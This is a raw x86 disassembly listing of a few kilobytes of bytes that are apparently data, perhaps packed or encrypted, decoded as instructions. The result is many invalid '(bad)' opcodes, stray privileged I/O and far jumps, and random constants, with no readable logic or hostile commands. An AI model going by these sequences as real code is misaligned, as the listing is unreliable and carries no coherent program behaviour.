  416a62:	rol    BYTE PTR [edx-0x445ad02b],0x31
  416a69:	adc    eax,DWORD PTR [ebx+ebp*4-0x39]
  416a6d:	mov    edx,DWORD PTR [edx-0x28929160]
  416a73:	jno    0x416a56
  416a75:	xchg   edx,eax
  416a76:	mov    ds:0x149c9cd9,al
  416a7b:	cmp    al,0xa
  416a7d:	loop   0x416acf
  416a7f:	xor    al,0x21
  416a81:	push   ds
  416a82:	and    DWORD PTR [edx+0xd],ebx
  416a85:	sub    esi,edx
  416a87:	and    ebx,DWORD PTR [edx]
  416a89:	pop    DWORD PTR [ecx]
  416a8b:	mov    al,0x63
  416a8d:	out    dx,al
  416a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a8f:	add    bh,dl
  416a91:	fldcw  WORD PTR [eax+0x73]
  416a94:	xor    DWORD PTR [eax],edi
  416a96:	lods   eax,DWORD PTR ds:[esi]
  416a97:	add    eax,DWORD PTR [ecx]
  416a99:	hlt    
  416a9a:	lea    ebx,[ebx+0x3e]
  416a9d:	pop    esi
  416a9e:	mov    edx,0xc2b8288e
  416aa3:	(bad)  
  416aa4:	(bad)  
  416aa6:	loopne 0x416a82
  416aa8:	push   edi
  416aa9:	push   edi
  416aaa:	mov    ds:0x72745ee2,eax
  416aaf:	xor    eax,0x37b30f3f
  416ab4:	mov    dl,0xad
  416ab6:	aad    0xbe
  416ab8:	push   0x5e
  416aba:	mov    al,ds:0x88f9a394
  416abf:	out    0xa8,al
  416ac1:	sub    ebx,esp
  416ac3:	ror    BYTE PTR [ebp+0x4f],cl
  416ac6:	imul   edx,DWORD PTR [esi],0xffffff90
  416ac9:	(bad)  
  416aca:	pop    ebp
  416acb:	inc    eax
  416acc:	push   ebx
  416acd:	cwde   
  416ace:	mul    BYTE PTR [ebx-0x3fefbbd0]
  416ad4:	mov    al,0xb6
  416ad6:	mov    ds:0x6bfbd317,al
  416adb:	xor    al,0x7c
  416add:	std    
  416ade:	int3   
  416adf:	fild   DWORD PTR [edx+0x66]
  416ae2:	mov    dh,BYTE PTR [edi+ebp*8-0x2e]
  416ae6:	ss cld 
  416ae8:	outs   dx,DWORD PTR ds:[esi]
  416ae9:	pop    edi
  416aea:	sbb    ecx,DWORD PTR [ebx-0x59]
  416aed:	clc    
  416aee:	out    0x25,al
  416af0:	dec    edx
  416af1:	fwait
  416af2:	jge    0x416af6
  416af4:	lahf   
  416af5:	push   es
  416af6:	ja     0x416b47
  416af8:	xor    DWORD PTR ds:0xc2df9480,edi
  416afe:	push   ss
  416aff:	adc    DWORD PTR [eax+0x4b],edx
  416b02:	lods   eax,DWORD PTR ds:[esi]
  416b03:	(bad)  
  416b04:	sahf   
  416b05:	nop
  416b06:	(bad)  
  416b07:	in     eax,dx
  416b08:	daa    
  416b09:	add    BYTE PTR [edi+0x22],0xeb
  416b0d:	jmp    0x416b28
  416b0f:	dec    esp
  416b10:	sub    ebx,esp
  416b12:	sub    al,0x48
  416b14:	sahf   
  416b15:	in     eax,0xca
  416b17:	or     DWORD PTR [esi],ebp
  416b19:	xchg   esi,eax
  416b1a:	out    0x3f,al
  416b1c:	xchg   ecx,eax
  416b1d:	cmp    ah,BYTE PTR [ebx]
  416b1f:	inc    ebx
  416b20:	xor    DWORD PTR [edx+esi*4+0x61],ebp
  416b24:	out    dx,eax
  416b25:	mov    ebp,0xa9227218
  416b2a:	sub    al,0x3
  416b2c:	ins    BYTE PTR es:[edi],dx
  416b2d:	or     eax,0x380558d5
  416b32:	mov    bl,0xd9
  416b34:	xor    eax,ebx
  416b36:	sub    al,0xd9
  416b38:	push   cs
  416b39:	push   cs
  416b3a:	ins    BYTE PTR es:[edi],dx
  416b3b:	data16 (bad) 
  416b3d:	cdq    
  416b3e:	shl    DWORD PTR [eax-0x28],cl
  416b41:	add    cl,BYTE PTR [ebx+0x7a]
  416b44:	sub    BYTE PTR [ebp+0x5f],0x5d
  416b48:	fisttp QWORD PTR [edi]
  416b4a:	arpl   WORD PTR [edx-0x18],si
  416b4d:	xchg   ebx,eax
  416b4e:	call   FWORD PTR [eax-0x37223fb6]
  416b54:	inc    ebp
  416b55:	iret   
  416b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b57:	scas   al,BYTE PTR es:[edi]
  416b58:	mov    bh,0x3a
  416b5a:	idiv   eax
  416b5c:	mov    al,0x6b
  416b5e:	(bad)  
  416b5f:	push   esi
  416b60:	push   ebx
  416b61:	sbb    ebx,esp
  416b63:	push   edx
  416b64:	add    DWORD PTR [edi-0x2b],ebp
  416b67:	push   edx
  416b68:	data16 mov al,ds:0xacc1481f
  416b6e:	ds mov bl,0xb9
  416b71:	mov    esi,0x3493f1ff
  416b76:	js     0x416bd1
  416b78:	adc    BYTE PTR [ebp-0x2b3d94d5],cl
  416b7e:	mov    sp,0xb53a
  416b82:	(bad)  
  416b83:	dec    edx
  416b84:	mov    ebx,0x78de03f6
  416b89:	jp     0x416b6c
  416b8b:	sub    edx,ebp
  416b8d:	mov    edi,esp
  416b8f:	cli    
  416b90:	sub    al,0x50
  416b92:	jmp    0x416b64
  416b94:	inc    ebp
  416b95:	mov    DWORD PTR [eax+eiz*4-0x41],ecx
  416b99:	ret    0xffa5
  416b9c:	mov    dh,ch
  416b9e:	xor    al,0x40
  416ba0:	or     esp,DWORD PTR [edi+0x64]
  416ba3:	mov    ebx,DWORD PTR [ecx-0x676f34d1]
  416ba9:	scas   eax,DWORD PTR es:[edi]
  416baa:	loop   0x416b46
  416bac:	and    dl,BYTE PTR [eax+ecx*2-0x36b9af9e]
  416bb3:	sub    bh,BYTE PTR [ecx-0x6e]
  416bb6:	add    DWORD PTR [edi],esp
  416bb8:	cmp    al,BYTE PTR [eax+edi*4-0x3c824bc6]
  416bbf:	jne    0x416c3e
  416bc1:	push   edx
  416bc2:	ins    BYTE PTR es:[edi],dx
  416bc3:	pop    eax
  416bc4:	mov    es,eax
  416bc6:	mov    edx,esp
  416bc8:	mov    ebp,DWORD PTR [edi]
  416bca:	jle    0x416b84
  416bcc:	cmp    edx,edi
  416bce:	push   ebp
  416bcf:	inc    esi
  416bd0:	or     ecx,DWORD PTR [esi+0x46cc6981]
  416bd6:	cld    
  416bd7:	xchg   ebx,eax
  416bd8:	push   esp
  416bd9:	test   DWORD PTR [esp+edx*4+0xb],eax
  416bdd:	mov    WORD PTR [edi+ebx*4-0x732335aa],ss
  416be4:	mov    ds:0xdac43334,eax
  416be9:	arpl   WORD PTR es:[eax],bp
  416bec:	jo     0x416bb8
  416bee:	fldcw  WORD PTR [ebx]
  416bf0:	mov    ds:0x1d977eb8,al
  416bf5:	shl    DWORD PTR [ecx-0x77],1
  416bf8:	in     eax,dx
  416bf9:	inc    edx
  416bfa:	add    eax,0x38b99a5a
  416bff:	jns    0x416c56
  416c01:	aad    0x6a
  416c03:	lock sahf 
  416c05:	mov    al,BYTE PTR [edi]
  416c07:	inc    esp
  416c08:	push   esp
  416c09:	into   
  416c0a:	dec    edi
  416c0b:	mov    edx,DWORD PTR [edx]
  416c0d:	cld    
  416c0e:	retf   
  416c0f:	or     ah,BYTE PTR [ecx]
  416c11:	iret   
  416c12:	sub    ch,bl
  416c14:	add    BYTE PTR [edi+0x33],ah
  416c17:	xor    BYTE PTR [ecx+ebx*8],cl
  416c1a:	push   0x66
  416c1c:	jmp    0x60d6:0x9d3d67f3
  416c23:	jo     0x416bf1
  416c25:	pop    eax
  416c26:	xchg   esp,eax
  416c27:	pop    edx
  416c28:	pop    edi
  416c29:	aas    
  416c2a:	cmp    eax,0xb92b4c5e
  416c2f:	xchg   DWORD PTR [ecx+0x41],ecx
  416c32:	inc    ecx
  416c33:	lahf   
  416c34:	pop    ebp
  416c35:	(bad)  
  416c36:	push   edi
  416c37:	add    edx,edx
  416c39:	shl    DWORD PTR [ebp-0x576c480],0xb8
  416c40:	ins    BYTE PTR es:[edi],dx
  416c41:	shl    DWORD PTR [ebx+0xd],0x7
  416c45:	push   esp
  416c46:	(bad)  
  416c47:	mov    BYTE PTR [ecx+0x68],dh
  416c4a:	inc    ebx
  416c4b:	push   ebp
  416c4c:	push   edi
  416c4d:	ins    BYTE PTR es:[edi],dx
  416c4e:	mov    ch,0x11
  416c50:	out    dx,eax
  416c51:	cld    
  416c52:	aaa    
  416c53:	mov    es,ebp
  416c55:	ds retf 0x9567
  416c59:	dec    eax
  416c5a:	add    BYTE PTR [esi+0x56af9e29],bh
  416c60:	sub    eax,0x6ccf4dc9
  416c65:	(bad)  
  416c67:	push   0x2bb1b58d
  416c6c:	ja     0x416c83
  416c6e:	ds ins BYTE PTR es:[edi],dx
  416c70:	mov    esi,0x7465161
  416c75:	arpl   WORD PTR [ebp-0x76f3c282],bx
  416c7b:	mov    bh,0x4f
  416c7d:	push   edx
  416c7e:	jb     0x416c02
  416c80:	mov    DWORD PTR [ebx-0x2eb8a3a3],edx
  416c86:	cld    
  416c87:	add    edi,DWORD PTR [edx+0x5a107c23]
  416c8d:	pop    edi
  416c8e:	pop    ecx
  416c8f:	popf   
  416c90:	add    eax,0xa5252264
  416c95:	in     al,dx
  416c96:	xor    al,0x0
	...
  416d14:	sbb    DWORD PTR [edi+ecx*8-0x1],esi
  416d18:	out    dx,eax
  416d19:	(bad)  
  416d1a:	cmp    esi,esi
  416d1c:	repnz sahf 
  416d1e:	mov    ebx,0xa0d97b23
  416d23:	or     al,0xc6
  416d25:	adc    BYTE PTR [ecx],al
  416d27:	add    BYTE PTR [ebx+0x7],ch
  416d2a:	add    BYTE PTR [eax],al
  416d2c:	ds pop esi
  416d2e:	sub    al,0xbf
  416d30:	call   0xb4ad:0xe503415
  416d37:	ins    BYTE PTR es:[edi],dx
  416d38:	add    bh,BYTE PTR [ecx-0x15]
  416d3b:	stos   DWORD PTR es:[edi],eax
  416d3c:	mov    dl,0x2b
  416d3e:	push   esp
  416d3f:	mov    ah,0x1f
  416d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d43:	je     0x416cc9
  416d45:	mov    fs,WORD PTR [edx-0x2d]
  416d48:	(bad)  
  416d49:	mov    ecx,0xa11c6c46
  416d4e:	jmp    0x408b:0xfee3bccc
  416d55:	pop    ss
  416d56:	hlt    
  416d57:	jmp    0x416d09
  416d59:	dec    edi
  416d5a:	imul   edx,DWORD PTR [edx],0x60eed670
  416d60:	lods   eax,DWORD PTR ds:[esi]
  416d61:	ffree  st(5)
  416d63:	cwde   
  416d64:	xor    al,0x93
  416d66:	ins    BYTE PTR es:[edi],dx
  416d67:	out    0xe1,al
  416d69:	jb     0x416da2
  416d6b:	adc    esi,DWORD PTR [ebp+0x6c2d935c]
  416d71:	xor    ebx,DWORD PTR [edi+0x36]
  416d74:	or     dl,BYTE PTR [edx-0x76f3aeff]
  416d7a:	repnz inc BYTE PTR [ebp+0x31]
  416d7e:	xchg   ebp,eax
  416d7f:	jne    0x416d6e
  416d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d82:	and    al,0xb2
  416d84:	or     al,0xd9
  416d86:	push   es
  416d87:	cmp    al,0x5e
  416d89:	inc    ebx
  416d8a:	add    edx,eax
  416d8c:	fstp   TBYTE PTR ds:0xe8af4004
  416d92:	das    
  416d93:	inc    eax
  416d94:	inc    sp
  416d96:	fisub  DWORD PTR [ebx+0x2b]
  416d99:	test   al,0xfb
  416d9b:	stos   DWORD PTR es:[edi],eax
  416d9c:	(bad)
  416d9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416da0:	popa   
  416da1:	and    BYTE PTR [esi],al
  416da3:	and    cl,BYTE PTR [ebx]
  416da5:	push   edi
  416da6:	mov    bl,0x31
  416da8:	(bad)
  416dab:	ret    0xc9be
  416dae:	dec    eax
  416daf:	stc    
  416db0:	mov    al,ds:0x3dda1107
  416db5:	push   eax
  416db6:	dec    edi
  416db7:	aas    
  416db8:	xor    al,0x8d
  416dba:	scas   eax,DWORD PTR es:[edi]
  416dbb:	fldcw  WORD PTR [eax-0x38a8dc98]
  416dc1:	jbe    0x416d63
  416dc3:	dec    esi
  416dc4:	iret   
  416dc5:	cmp    eax,0xb146527
  416dca:	pop    es
  416dcb:	gs mov ds:0xa478f977,al
  416dd2:	iret   
  416dd3:	stos   DWORD PTR es:[edi],eax
  416dd4:	xor    DWORD PTR [edx-0x31],edi
  416dd7:	arpl   WORD PTR [edi+0x231c3794],dx
  416ddd:	call   0x87335873
  416de2:	es dec eax
  416de4:	ja     0x416d8e
  416de6:	mov    eax,ds:0x3432ec63
  416deb:	arpl   WORD PTR [esi-0x10f8d8b],di
  416df1:	dec    edi
  416df2:	cs sbb eax,0x339ddebc
  416df8:	or     eax,0x3895bebb
  416dfd:	in     al,0x2a
  416dff:	mov    dh,0x9
  416e01:	add    bh,BYTE PTR [ebp-0x12]
  416e04:	test   DWORD PTR [esi],esi
  416e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e07:	inc    esi
  416e08:	xor    eax,0x28417a15
  416e0d:	rcl    ecx,1
  416e0f:	sub    bh,bh
  416e11:	(bad)  
  416e12:	mov    edx,ecx
  416e14:	mov    edx,0x35642507
  416e19:	lods   al,BYTE PTR ds:[esi]
  416e1a:	mov    bh,BYTE PTR [edx+0x3d]
  416e1d:	test   esp,edi
  416e1f:	bound  esi,QWORD PTR ds:0x7477bc68
  416e25:	test   BYTE PTR [esi+0x270c78c5],bl
  416e2b:	sub    dl,BYTE PTR [eax-0xd]
  416e2e:	and    eax,0x75edc1be
  416e33:	aad    0x32
  416e35:	adc    esp,DWORD PTR [esi]
  416e37:	sub    DWORD PTR [eax+edx*2-0x12],0x16
  416e3c:	jp     0x416dd1
  416e3e:	retf   
  416e3f:	and    ebx,DWORD PTR ds:0xa8c7cd98
  416e45:	dec    ebp
  416e46:	mov    ah,0x5e
  416e48:	cli    
  416e49:	jo     0x416e4f
  416e4b:	call   0x25c38bab
  416e50:	jne    0x416e6c
  416e52:	call   0x70359c62
  416e57:	dec    ebp
  416e58:	repz (bad) 
  416e5a:	sti    
  416e5b:	ret    
  416e5c:	xchg   DWORD PTR [edi],edi
  416e5e:	mov    al,ds:0x428a71c4
  416e63:	es aaa 
  416e65:	setle  BYTE PTR [eax]
  416e68:	jecxz  0x416def
  416e6a:	push   esp
  416e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e6c:	sub    DWORD PTR [edx-0x4296e2df],eax
  416e72:	(bad)  
  416e73:	jmp    0x1f16:0xa0dd9725
  416e7a:	xchg   ebx,eax
  416e7b:	shl    DWORD PTR cs:[ebx+0x7],cl
  416e7f:	mov    bh,0xc8
  416e81:	push   eax
  416e82:	push   cs
  416e83:	mov    ds:0xb87cfab1,al
  416e88:	dec    edx
  416e89:	jne    0x416ebb
  416e8b:	and    ah,cl
  416e8d:	adc    al,ah
  416e8f:	xor    DWORD PTR [edi-0x52],edx
  416e92:	mov    WORD PTR [ecx],fs
  416e94:	arpl   WORD PTR [ebp-0x26dd8c74],bp
  416e9a:	lahf   
  416e9b:	ja     0x416ed6
  416e9d:	pop    es
  416e9e:	mov    BYTE PTR [ecx],dl
  416ea0:	xlat   BYTE PTR ds:[ebx]
  416ea1:	arpl   WORD PTR [ebp-0x2b],di
  416ea4:	out    dx,eax
  416ea5:	ficom  DWORD PTR [edx]
  416ea7:	xor    al,0x1d
  416ea9:	in     al,0xee
  416eab:	and    eax,0xf91f1cba
  416eb0:	jne    0x416e6c
  416eb2:	or     al,0xb
  416eb4:	maxps  xmm4,XMMWORD PTR [eax]
  416eb7:	xchg   BYTE PTR [ebx+0x33fca90],bl
  416ebd:	clc    
  416ebe:	jae    0x416e84
  416ec0:	xor    DWORD PTR ds:0x99ee1e14,ebp
  416ec6:	repz xchg edx,eax
  416ec8:	dec    ebp
  416ec9:	jnp    0x416edb
  416ecb:	pop    edx
  416ecc:	pop    esi
  416ecd:	addr16 pop ss
  416ecf:	cmp    ah,al
  416ed1:	mov    dh,0x85
  416ed3:	pop    ds
  416ed4:	mov    bh,BYTE PTR [edx+eiz*1-0x28]
  416ed8:	cmp    edx,ecx
  416eda:	pop    es
  416edb:	(bad)  
  416edc:	out    dx,eax
  416edd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ede:	(bad)  
  416edf:	jmp    0x416e8a
  416ee1:	mov    ds:0xc8856a17,al
  416ee6:	pop    es
  416ee7:	sbb    al,0x60
  416ee9:	mov    al,0xbc
  416eeb:	popf   
  416eec:	mov    ds:0x46bc305c,al
  416ef1:	add    dh,BYTE PTR [eax-0x3b]
  416ef4:	arpl   WORD PTR [ebx+0x2e],si
  416ef7:	sbb    al,0xcd
  416ef9:	in     al,0x0
  416efb:	sbb    al,0xac
  416efd:	cs cmc 
  416eff:	(bad)  [edx+0x22067914]
  416f05:	js     0x416f0b
  416f07:	int3   
  416f08:	xor    BYTE PTR [ecx-0x31644586],ch
  416f0e:	(bad)  ds:[ebp-0x4b]
  416f12:	out    0xd6,al
  416f14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f15:	pop    eax
  416f16:	fisubr WORD PTR [ebp-0x7]
  416f19:	test   al,0xbb
  416f1b:	in     eax,dx
  416f1c:	mov    dh,0x65
  416f1e:	leave  
  416f1f:	out    dx,eax
  416f20:	gs mov edi,0xc704961b
  416f26:	fist   DWORD PTR [ebp-0x33]
  416f29:	popa   
  416f2a:	jbe    0x416f97
  416f2c:	inc    eax
  416f2d:	jno    0x416ed5
  416f2f:	dec    edi
  416f30:	push   ecx
  416f31:	ins    DWORD PTR es:[edi],dx
  416f32:	adc    DWORD PTR [edi+0xefe722],ebp
  416f38:	into   
  416f39:	aaa    
  416f3a:	fadd   QWORD PTR [edi+0x4d]
  416f3d:	jno    0x416ee5
  416f3f:	and    edx,ecx
  416f41:	xor    ah,BYTE PTR [edx]
  416f43:	ss jmp 0xee7d7fad
  416f49:	arpl   sp,ax
  416f4b:	mov    ebx,0x5f2fb228
  416f50:	mov    ecx,0x15b98b5a
  416f55:	(bad)  [ebp+edx*4+0x9]
  416f59:	popa   
  416f5a:	sub    bl,dl
  416f5c:	xchg   WORD PTR [ecx+ebx*1],di
  416f60:	xor    DWORD PTR [eax+0x38],ebx
  416f63:	xlat   BYTE PTR ds:[ebx]
  416f64:	mov    edi,0x84df8fa2
  416f69:	lock jb 0x416ef3
  416f6c:	xor    eax,0xc00672c3
  416f71:	adc    bh,cl
  416f73:	or     dh,BYTE PTR [eax]
  416f75:	mov    esi,0xea49cf22
  416f7a:	or     al,0x3d
  416f7c:	pop    ds
  416f7d:	jne    0x416fd7
  416f7f:	jge    0x416f2c
  416f81:	aad    0x72
  416f83:	pop    ecx
  416f84:	cs jbe 0x416ff0
  416f87:	call   0x543082b7
  416f8c:	adc    ch,BYTE PTR [ebp+0x59]
  416f8f:	or     ebp,DWORD PTR [edi]
  416f91:	out    dx,al
  416f92:	cdq    
  416f93:	clc    
  416f94:	rcl    DWORD PTR [ecx],1
  416f96:	sub    al,bl
  416f98:	ror    DWORD PTR [eax-0x4d9b6156],0x8c
  416f9f:	repz cmp BYTE PTR [edx],ch
  416fa2:	test   cl,bl
  416fa4:	xchg   esi,eax
  416fa5:	(bad)  
  416fa6:	push   DWORD PTR [ebx+0x1ba04893]
  416fac:	fimul  WORD PTR [edx]
  416fae:	cmp    eax,0xd93895c8
  416fb3:	fcom   DWORD PTR [eax]
  416fb5:	pushf  
  416fb6:	call   0x95ea267f
  416fbb:	inc    ebp
  416fbc:	enter  0x95b7,0xb8
  416fc0:	xchg   esp,eax
  416fc1:	fld    st(4)
  416fc3:	cmp    cl,bh
  416fc5:	je     0x416fae
  416fc7:	loope  0x416fb9
  416fc9:	xchg   ecx,eax
  416fca:	les    ecx,FWORD PTR [edx-0x2a427774]
  416fd0:	add    edx,esi
  416fd2:	repz dec edi
  416fd4:	es in  eax,0x8c
  416fd7:	add    ah,BYTE PTR [ebx]
  416fd9:	pop    edi
  416fda:	lahf   
  416fdb:	(bad)  
  416fdc:	js     0x417043
  416fde:	and    al,0x62
  416fe0:	pop    edx
  416fe1:	push   0x63
  416fe3:	sub    DWORD PTR [ebp-0x32],esp
  416fe6:	cmp    eax,0x8e50feb1
  416feb:	fs jb  0x416fdd
  416fee:	imul   DWORD PTR [esi-0x7f]
  416ff1:	dec    ecx
  416ff2:	mov    bl,0x9c
  416ff4:	scas   eax,DWORD PTR es:[edi]
  416ff5:	rol    BYTE PTR [ecx-0x6ef33260],0x83
  416ffc:	pop    ss
  416ffd:	fcos   
  416fff:	cmp    BYTE PTR [ebp+0x7],dl
  417002:	test   DWORD PTR [edi],ebp
  417004:	mov    ebx,0x6f585f29
  417009:	out    0x17,al
  41700b:	das    
  41700c:	jp     0x416ff3
  41700e:	xor    eax,DWORD PTR [ebx]
  417010:	(bad)  
  417011:	or     ah,ch
  417013:	mov    al,ds:0x7f8d52f9
  417018:	jmp    0x29ce9ce5
  41701d:	dec    ecx
  41701e:	pop    ds
  41701f:	mov    esp,0xf60dc8bc
  417024:	sbb    BYTE PTR [esi],0xfe
  417027:	cli    
  417028:	mov    bh,0xe7
  41702a:	adc    BYTE PTR [eax],cl
  41702c:	cli    
  41702d:	pop    esp
  41702e:	mov    edi,0x129646ff
  417033:	loopne 0x417053
  417035:	inc    ebp
  417036:	fdiv   DWORD PTR [ecx]
  417038:	push   edi
  417039:	std    
  41703a:	dec    esi
  41703b:	in     eax,0x17
  41703d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41703e:	xchg   edi,eax
  41703f:	push   ds
  417040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417041:	loopne 0x4170b6
  417043:	or     BYTE PTR [esp+ebx*8],dh
  417046:	and    ecx,DWORD PTR ds:0x9b432b64
  41704c:	fidivr WORD PTR [bx+di-0x6911]
  417051:	popa   
  417052:	shr    DWORD PTR [ebp-0x68],0xe0
  417056:	cmp    al,0xfb
  417058:	call   0xd4e68379
  41705d:	adc    ecx,DWORD PTR [edi-0x44b4d327]
  417063:	call   0xd53cee7f
  417068:	xchg   ebx,eax
  417069:	xchg   DWORD PTR [edx-0x3c07187],ebp
  41706f:	and    DWORD PTR [edx+0x6d708e5a],0xffffff9f
  417076:	xchg   ebx,eax
  417077:	mov    al,bh
  417079:	scas   eax,DWORD PTR es:[di]
  41707b:	stos   DWORD PTR es:[edi],eax
  41707c:	xchg   ebx,eax
  41707d:	cwde   
  41707e:	mov    WORD PTR [esi],es
  417080:	add    DWORD PTR [ebp-0x14de9350],ebp
  417086:	mov    ebx,0x54658370
  41708b:	mov    esi,DWORD PTR es:[esi-0x1810f008]
  417092:	shl    DWORD PTR [ecx],0x50
  417095:	xchg   ebx,eax
  417096:	lds    ecx,FWORD PTR [ebx+0x65ac8e74]
  41709c:	mov    ecx,0xafb90dc0
  4170a1:	test   al,0x8a
  4170a3:	sub    ch,cl
  4170a5:	push   es
  4170a6:	push   0xe92d7aa1
  4170ab:	popf   
  4170ac:	mul    DWORD PTR [ecx-0x6844a98b]
  4170b2:	pop    ds
  4170b3:	jnp    0x41704e
  4170b5:	push   ebp
  4170b6:	xchg   ebp,eax
  4170b7:	(bad)  [ebx-0x18269359]
  4170bd:	sbb    BYTE PTR [esi+edx*1+0x72],dl
  4170c1:	ficomp WORD PTR [ecx]
  4170c3:	imul   esp,DWORD PTR [eax],0x3b4091ff
  4170c9:	mov    esi,0x88ed8c19
  4170ce:	repz sub bh,dl
  4170d1:	jb     0x4170e5
  4170d3:	loope  0x4170ea
  4170d5:	stos   BYTE PTR es:[edi],al
  4170d6:	xchg   ecx,eax
  4170d7:	jns    0x417061
  4170d9:	ins    BYTE PTR es:[edi],dx
  4170da:	and    ecx,DWORD PTR [ecx]
  4170dc:	int3   
  4170dd:	and    BYTE PTR [edx],cl
  4170df:	retf   
  4170e0:	dec    esi
  4170e1:	pushf  
  4170e2:	mul    DWORD PTR [esi]
  4170e4:	xor    BYTE PTR [esi-0x65],ah
  4170e7:	dec    esp
  4170e8:	mov    BYTE PTR [edi],al
  4170ea:	repz mov ebx,0xaa8baf19
  4170f0:	out    dx,al
  4170f1:	dec    eax
  4170f2:	inc    edx
  4170f3:	scas   eax,DWORD PTR es:[edi]
  4170f4:	jo     0x41713d
  4170f6:	sbb    esi,DWORD PTR [ecx+0x57a1bef]
  4170fc:	xchg   ecx,eax
  4170fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170fe:	bound  ecx,QWORD PTR [edx]
  417100:	adc    BYTE PTR [eax+0x5c],dl
  417103:	loop   0x417146
  417105:	daa    
  417106:	mov    ds:0x8004dd8e,eax
  41710b:	in     al,dx
  41710c:	ja     0x4170ac
  41710e:	jnp    0x4170b8
  417110:	ret    0x1bbc
  417113:	mov    edx,0x48e16c4e
  417118:	outs   dx,BYTE PTR ds:[esi]
  417119:	pop    edx
  41711a:	inc    edi
  41711b:	pusha  
  41711c:	jp     0x417105
  41711e:	fcmovnbe st,st(5)
  417120:	lods   eax,DWORD PTR ds:[esi]
  417121:	bound  ebp,QWORD PTR [ecx+0x35]
  417124:	sbb    ebx,eax
  417126:	dec    ebp
  417127:	sub    esi,DWORD PTR [esi-0x74298190]
  41712d:	mov    ebp,0xe43fccdf
  417132:	fcom   QWORD PTR [eax]
  417134:	dec    ecx
  417135:	ss fcomp st(1)
  417138:	mov    ds:0xdd041fc8,al
  41713d:	(bad)  
  41713e:	mov    BYTE PTR [ebx-0x53],dl
  417141:	gs and eax,ebx
  417144:	ret    
  417145:	gs jecxz 0x417171
  417148:	mov    gs,WORD PTR [edi+0x39]
  41714b:	retf   
  41714c:	pusha  
  41714d:	sub    eax,0x8b9e51fe
  417152:	enter  0x1a56,0xce
  417156:	mov    ebp,0x89b67307
  41715b:	(bad)  
  41715c:	out    0x39,eax
  41715e:	sbb    BYTE PTR [ebp-0x2a],ch
  417161:	mov    al,0x9a
  417163:	leave  
  417164:	inc    ebp
  417165:	(bad)  
  417166:	fcomp  st(6)
  417168:	mov    ebp,0x3fa5db62
  41716d:	or     eax,0x87b01dec
  417172:	mov    ds:0x8244abb3,eax
  417177:	dec    esi
  417178:	rcr    DWORD PTR [edi-0x4e8d4eb5],0x80
  41717f:	ds clc 
  417181:	and    DWORD PTR [edx],esi
  417183:	jge    0x4171f3
  417185:	shl    bl,cl
  417187:	js     0x4171d8
  417189:	sbb    ah,BYTE PTR [esi]
  41718b:	ret    
  41718c:	xor    DWORD PTR [ecx],0xffffff8c
  41718f:	stos   DWORD PTR es:[edi],eax
  417190:	test   DWORD PTR ds:0x289871a6,0x94e307a0
  41719a:	in     eax,0x98
  41719c:	jns    0x417175
  41719e:	in     al,dx
  41719f:	mov    esi,0x77dfa2d9
  4171a4:	int    0x21
  4171a6:	iret   
  4171a7:	sub    cl,bh
  4171a9:	sbb    ebp,DWORD PTR [edi+ecx*4+0x56]
  4171ad:	and    BYTE PTR [ecx-0x2c],0xe6
  4171b1:	mov    ?,WORD PTR [ebx+esi*4]
  4171b4:	std    
  4171b5:	dec    edx
  4171b6:	fild   WORD PTR [eax]
  4171b8:	ficomp DWORD PTR [ebx]
  4171ba:	lea    ecx,ds:0xaa630c3c
  4171c0:	cwde   
  4171c1:	and    eax,0xa899541d
  4171c6:	loopne 0x41721c
  4171c8:	mov    eax,edi
  4171ca:	fmul   st,st(7)
  4171cc:	and    eax,0x36f1b8ed
  4171d1:	imul   ecx,esi,0x54
  4171d4:	ins    BYTE PTR es:[edi],dx
  4171d5:	outs   dx,DWORD PTR ds:[esi]
  4171d6:	jo     0x417251
  4171d8:	jecxz  0x417192
  4171da:	loope  0x41721f
  4171dc:	mov    esp,0xdc3721f2
  4171e1:	xor    DWORD PTR [esi+ecx*8+0x1e],0x2e430daf
  4171e9:	mov    dl,0xff
  4171eb:	int    0x92
  4171ed:	in     al,dx
  4171ee:	and    BYTE PTR [edi],ah
  4171f0:	mov    al,0x78
  4171f2:	xchg   BYTE PTR [esi+0x66],ah
  4171f5:	(bad)  
  4171f6:	dec    esp
  4171f7:	dec    ebp
  4171f8:	aaa    
  4171f9:	fild   QWORD PTR [eax-0x75739c45]
  4171ff:	imul   ecx,edi,0x1194d36c
  417205:	sti    
  417206:	out    0xf8,eax
  417208:	hlt    
  417209:	inc    esi
  41720a:	inc    ebp
  41720b:	jp     0x4171ab
  41720d:	cmp    BYTE PTR [ebp+0x5],bl
  417210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417211:	xchg   esp,eax
  417212:	addr16 loope 0x417247
  417215:	inc    ebp
  417216:	or     BYTE PTR [eax-0x5369629f],dh
  41721c:	cli    
  41721d:	cmp    al,0x60
  41721f:	sub    al,0x37
  417221:	mov    esp,0x38a19cf2
  417226:	mov    ebx,0x427b5ea7
  41722b:	jge    0x4172a8
  41722d:	jne    0x417227
  41722f:	sub    BYTE PTR [esi],bl
  417231:	sbb    dl,BYTE PTR [ebx]
  417233:	(bad)  
  417234:	gs test al,0x5
  417237:	idiv   dl
  417239:	jb     0x41727a
  41723b:	imul   ebp,DWORD PTR [eax-0x62],0xffffff9e
  41723f:	push   edi
  417240:	push   ds
  417241:	add    DWORD PTR [ecx*4+0x44837d3a],ebx
  417248:	or     DWORD PTR [ebp-0x22],edx
  41724b:	mov    al,ds:0x6f8f4b57
  417250:	jno    0x4171ea
  417252:	int    0x6e
  417254:	adc    eax,0x45016477
  417259:	(bad)  
  41725b:	mov    bl,0xb9
  41725d:	leave  
  41725e:	push   edi
  41725f:	sbb    ebp,ebp
  417261:	jo     0x41728e
  417263:	imul   edi,esp,0x52
  417266:	aaa    
  417267:	mov    eax,ds:0xa20adb8
